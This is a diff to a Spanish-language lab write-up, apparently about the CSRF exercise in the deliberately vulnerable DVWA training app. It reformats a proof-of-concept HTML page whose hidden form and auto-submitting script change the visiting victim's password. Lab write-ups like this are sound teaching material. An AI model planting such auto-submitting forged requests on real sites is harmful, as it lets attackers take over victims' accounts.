@@ -26,15 +26,20 @@ La aplicación acepta cualquier solicitud POST válida, incluso si proviene de o
 Se crea un archivo `csrf.html` con el siguiente contenido:
 
 ```html
-<form action="http://127.0.0.1/DVWA/vulnerabilities/csrf/" method="POST">
-  <input type="hidden" name="password_new" value="pass" />
-  <input type="hidden" name="password_conf" value="pass" />
-  <input type="hidden" name="change" value="change" />
-  <input type="submit" value="Submit request" />
-</form>
-<script>
-  document.forms[0].submit();
-</script>
+<html>
+  <body>
+    <form action="http://127.0.0.1/DVWA/vulnerabilities/csrf/" method="POST">
+      <input type="hidden" name="password_new" value="pass" />
+      <input type="hidden" name="password_conf" value="pass" />
+      <input type="hidden" name="change" value="change" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
 ```
 
 Este archivo realiza un cambio de contraseña de forma automática cuando la víctima lo visita.
